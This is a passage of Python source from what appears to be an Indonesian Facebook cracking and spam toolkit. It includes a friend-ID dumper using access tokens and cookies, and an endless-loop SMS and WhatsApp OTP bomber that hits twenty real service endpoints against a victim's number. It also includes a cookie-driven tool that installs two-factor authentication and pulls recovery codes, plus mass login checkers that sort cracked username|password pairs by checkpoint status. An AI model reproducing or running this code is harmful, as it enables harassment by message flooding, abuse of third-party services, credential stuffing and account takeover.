		prints(nel(f'{P2}Hasil dump tersimpan di: /sdcard/dump/1000{target}.txt\nKlik ctrl z untuk berhenti dump{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		for user in self.id:
			try:
				header = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"}
				req = requests.get("https://graph.facebook.com/v15.0/"+user+"?fields=friends.limit(5000){id,name}&access_token="+self.token,cookies={"cookie": self.cookie},headers=header).json()
				for res in req['friends']['data']:
					sys.stdout.write(f'\r[•] Mengumpulkan id: {self.loop}')
					try:
						inpo = res['id']
						if inpo[0:5] == f'1000{target}':
							open(f'/sdcard/dump/1000{target}.txt','a').write(res['id']+'|'+res['name']+'\n')
							self.loop+=1
						else:continue

					except:
						continue
			except (KeyError,IOError,AttributeError):continue
agent = []
#---------[USER AGENT MEMEK]----------#
agent = random.choice(
			[
				"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
				"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
				"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
		]
	)

#----------[BAUT SPAM SMS]----------#
def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	prints(nel(f'{P2}Contoh : {H2}+6281234567xxx{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	nomor = input(f"[+] input no hp :\033[32m +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang spam sms...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "User-Agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "User-Agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "User-Agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "User-Agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"User-Agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"User-Agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		prints(nel(f'{P2}Sukses spam SMS ke no : {K2}+62{nomor}{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		
#-----------[BUAT SPAM WHATSAPP]---------#
def spam_wa():
	global nomor
	prints(nel(f'{P2}Contoh : {H2}+6281234567xxx{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	nomor = input(f"[+] input no hp :\033[32m +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang kirim pesan ke WhatsApp...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "User-Agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "User-Agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		prints(nel(f'{P2}Sukses spam WA ke no : {K2}+62{nomor}',width=70,padding=(0,7),style=f"{color_panel}")) 
		
		
#----------[BUAT PASANG A2F ACCOUNT FACEBOOK]----------#
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests as req, re
from bs4 import BeautifulSoup as par

headers = {
	"Host":"mbasic.facebook.com",
	"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	"origin":"https://www.facebook.com",
	"referer":"https://www.facebook.com",
	"sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
	"upgrade-insecure-requests":"1",
	"user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
}

ses = req.Session()
ses.headers.update(headers)

class Main(object):
	
	def __init__(self,coki):
		self.coki = {"cookie":coki}
	def cek(self):
		try:
			r = par(
				ses.get(
					"https://mbasic.cinyour.facebook.com/security/2fac/setup/intro/metadata/?source=1",cookies=self.coki
				).text, 'html.parser'
			)
		except req.exceptions.TooManyRedirects:
			r = par(
				req.get(
					"https://mbasic.cinyour.facebook.com/security/2fac/setup/intro/metadata/?source=1",cookies=self.coki
				).text, 'html.parser'
			)
		try:
			lanjut = r.find(
				"a",string="Gunakan Aplikasi Autentikasi"
			).get(
				"href"
			)
		except:
			prints(nel(f'{P2}akun anda sudah terpasang a2f{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		try:
			__r = ses.get(lanjut,cookies=self.coki).text
		except req.exceptions.TooManyRedirects:
			__r = req.get(lanjut,cookies=self.coki).text
		co = par(__r, 'html.parser')
		try:
			kode = self.get_kode(co)
			prints(nel(f'{P2}Key authen : {H2}{kode}\n{P2}Masukan key authen di aplikasi authen 2 faktor{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		except:
			if "Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan." in __r:
				prints(nel(f'{P2}Demi keamanan, masukkan kata sandi Facebook anda untuk melanjutkan.\nNote : {M2}Jika terjadi kesalahan masukan kode authen dan terjadi sinyal internet tidak ada, jalanin script lagi dan masukan cookie lagi terimakasih{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				sandi = pwinput("[+] Password facebook: ", "*")
				lanjut = co.find(
					'form',{
						'method':'post'
					}
				)
				memek = {}
				lst = ["fb_dtsg","jazoest","save"]
				for x in lanjut:
					if x.get("name") in lst:
						memek.update(
							{
								x.get(
									"name"
								):x.get(
									"value"
								)
							}
						)
				memek.update(
					{
						"pass":sandi
					}
				)
				response = ses.post(
					lanjut.get(
						"action"
					),cookies=self.coki,data=memek
				).text
				if "Kata sandi yang Anda masukkan tidak benar." in response:
					prints(nel(f'{P2}Kata sandi yang Anda masukkan tidak benar.{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
				else:
					try:
						kode = self.get_kode(response)
					except IndexError:
						prints(nel(f'{P2}Facebook terkena checkpoint{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
				prints(nel(f'{P2}Key authen : {H2}{kode}\n{P2}Masukan key authen di aplikasi authen 2 faktor{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			else:
				prints(nel(f'{P2}Facebook terkena checkpoint{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		self.masuk(co)

class Pasang(Main):
	
	def pasang(self,link,data_code):
		return ses.post(
			"https://mbasic.cinyour.facebook.com"+str(
				link
			),data=data_code,cookies=self.coki
		).text
	def get_kode(self,res):
		kode = re.findall(
			'\<div\ class\=\".*?\"\>Atau masukkan kode ini ke aplikasi autentikasi Anda<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>\<\/div\>',str(
				res
			)
		)[0]
		return kode
	def kode_pemulihan(self,kontol):
		num = 0
		for x in kontol.find_all('span'):
			if(
				re.findall(
					'\d+\s\d+',str(
						x
					)
				)
			):
				num+=1
				if(num==1):
					print(f"➛ {x.text}")
				else:
					print(f"➛ {x.text}")
	def get_kode_pemulihan(self):
		waifu_wangy = {
			"Host":"mbasic.cinyour.facebook.com",
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"content-type":"application/x-www-form-urlencoded",
			"origin":"https://m.cinyour.facebook.com",
			"referer":"https://m.cinyour.facebook.com",
			"upgrade-insecure-requests":"2",
			"user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
		}
		ses.headers.update(waifu_wangy)
		__res = ses.get("https://mbasic.cinyour.facebook.com/security/2fac/factors/recovery-code/",cookies=self.coki).text
		kontol = par(__res, 'html.parser')
		if "Gunakan kode pemulihan untuk login jika Anda kehilangan ponsel atau tidak dapat menerima kode verifikasi melalui pesan teks atau aplikasi autentikasi." in __res:
			data = {}
			lst = ["fb_dtsg","jazoest","reset"]
			for x in kontol.find(
				'form',{
					'method':'post'
				}
			):
				if x.get('name') in lst:
					data.update(
						{x.get(
							'name'
						):x.get(
							'value'
						)
					}
				)
			data.update(
				{
					"":"Dapatkan Kode"
				}
			)
			kontol = par(
				ses.post(
					"https://mbasic.cinyour.facebook.com/security/2fac/factors/recovery-code/",cookies=self.coki,data=data
				).text, 'html.parser'
			)
			self.kode_pemulihan(kontol)
		else:
			self.kode_pemulihan(kontol)
	def masuk(self,co):
		data = {}
		masuk = input("[+] Masukan kode authen: ")
		lst = ["fb_dtsg","jazoest","code_handler_type","confirmButton"]
		lanjut = co.find(
			'form',{
				'method':'post'
			}
		)
		for x in lanjut:
			if x.get('name') in lst:
				data.update(
					{x.get(
						'name'
					):x.get(
						'value'
					)
				}
			)	
		data.update(
			{
				'confirmButton':'Lanjutkan'
			}
		)
		res = par(
			ses.post(
				'https://mbasic.cinyour.facebook.com'+str(
					lanjut.get(
						"action"
					)
				),cookies=self.coki,data=data
			).text, 'html.parser'
		)
		data.clear()
		lanjut = res.find(
			"form",{
				"id":"input_form"
			}
		)
		lst = ["fb_dtsg","jazoest"]
		for x in lanjut:
			if x.get("name") in lst:
				data.update(
					{x.get(
						"name"
					):x.get(
						"value"
					)
				}
			)
		data.update({
			"code":masuk,
			"submit_code_button":"Lanjutkan"
		})
		response = self.pasang(
			lanjut.get(
				"action"
			),data
		)
		if "checkpoint" in response:
			prints(nel(f'{P2}Ops akun terkena checkpoint{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		elif "Autentikasi Dua Faktor Aktif" in response:
			prints(nel(f'{P2}Selamat a2f Berhasil di pasang{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			print("[+] Kode pemulihan: ")
			self.get_kode_pemulihan()
		else:
			prints(nel(f'{P2}Text: {H2}%s{P2}'%(response),width=70,padding=(0,7),style=f"{color_panel}"))
			print("[+] ",response)
			prints(nel(f'{P2}Ada yang salah di script, coba laporkan ke Developer. Copy text di atas! Kirim ke wa 6289530656600{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()

#----------[BUAT CHEK ACCOUNT FACEBOOK]----------#
import requests, re, os, sys
from bs4 import BeautifulSoup

def clear():
	if "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

ok,cp,error = 0,0,0

class Main:
	
	def __init__(self, useragent):
		self.ua = useragent
		self.host = "mbasic.facebook.com"

class Login(Main):
	
	def check_options(self, session, response, user, password):
		ref = BeautifulSoup(response.text, "html.parser")
		form = ref.find("form", {"method":"post", "enctype":True})
		data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
		data.update(
			{
				"submit[Continue]":"Lanjutkan"
			}
		)
		response = BeautifulSoup(session.post("https://mbasic.facebook.com"+str(form.get("action")), data=data).text, "html.parser")
		try:
			options = [x.string for x in response.find("select", {"id":"verification_method", "name":"verification_method"}).findAll("option")]
		except:
			options = []
			status = "a2f on"
		if(len(options)==0 and status!="a2f on"):
			status = "tap yes"
		elif(len(options)!=0):
			status = "checkpoint"
		else:
			status = "a2f on"
		output = {
			"account":f"{user}|{password}",
			"output":{
				"status":status,
				"options":options,
				"jumlah_opsi":len(options)
			}
		}
		return output
    
	def log_mfacebook(self, user, password):
		global ok,cp,error
		with requests.Session() as session:
			session.headers.update(
				{
					"host":self.host,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-encoding":"gzip, deflate",
					"accept-language":"en-US,en;q=0.9,id;q=0.8",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent":self.ua
				}
			)
			fbml = session.get("https://mbasic.facebook.com/fbml/ajax/dialog/")
			soup = BeautifulSoup(fbml.text, "html.parser")
			next_url = soup.findAll("a", {"class":True, "id":True})[1].get("href")
			session.headers.update(
				{
					"referer":"https://mbasic.facebook.com/fbml/ajax/dialog/",
				}
			)
			ref = BeautifulSoup(session.options(next_url).text, "html.parser")
			form = ref.find("form", {"method":"post", "id":"login_form"})
			data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
			nextTo = form.get("action")
			data.update(
				{
					"email":user,
					"pass":password,
					"login":"Masuk"
				}
			)
			response = session.post("https://mbasic.facebook.com"+str(nextTo), data=data, headers = {
				"content-length":"164",
				"content-type":"application/x-www-form-urlencoded",
				"origin":"https://mbasic.facebook.com",
				"referer":"https://mbasic.facebook.com"+str(nextTo)
			})
			try:
				if "checkpoint" in response.cookies:
					cp += 1
					output = self.check_options(session, response, user, password)
				elif "m_page_voice" in response.cookies:
					ok += 1
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":"OK",
							"options":None,
							"jumlah_opsi":None
						}
					}
				else:
					error += 1
					soup = BeautifulSoup(response.text, "html.parser")
					try:status = soup.find("div", {"id":"login_error"}).string
					except:status = "aktivitas berlebihan terdeteksi [spam]. segera on off mode pesawat!"
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":status,
							"options":False,
							"jumlah_opsi":False
						}
					}
			except Exception as e:print(response.text)
			return output

#-----------[BUAT CEK OPSI CRACKER]---------#
def ceker(idf,pw):
	global cp
	ua = random.choice(ugen7)
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r                ➛ %sOpsi CheckPoint :   %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		opsi = kent.find_all('option')
		if len(opsi)==0:
